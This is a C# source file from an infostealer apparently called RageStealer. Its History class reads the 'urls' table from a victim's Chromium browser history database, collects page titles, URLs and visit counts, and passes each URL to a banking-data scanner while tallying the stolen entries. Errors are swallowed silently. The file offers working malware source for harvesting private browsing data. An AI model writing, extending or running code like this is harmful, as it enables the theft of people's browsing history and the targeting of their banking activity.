using System;
using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class History
{
	public static List<Site> Get(string sHistory)
	{
		List<Site> list = new List<Site>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sHistory, "urls");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Site site = default(Site);
				site.Title = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				site.Url = Crypto.GetUtf8(sqLite.GetValue(i, 2));
				site.Count = Convert.ToInt32(sqLite.GetValue(i, 3)) + 1;
				Site item = site;
				list.Add(item);
				Banking.ScanData(item.Url);
				Counter.History++;
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
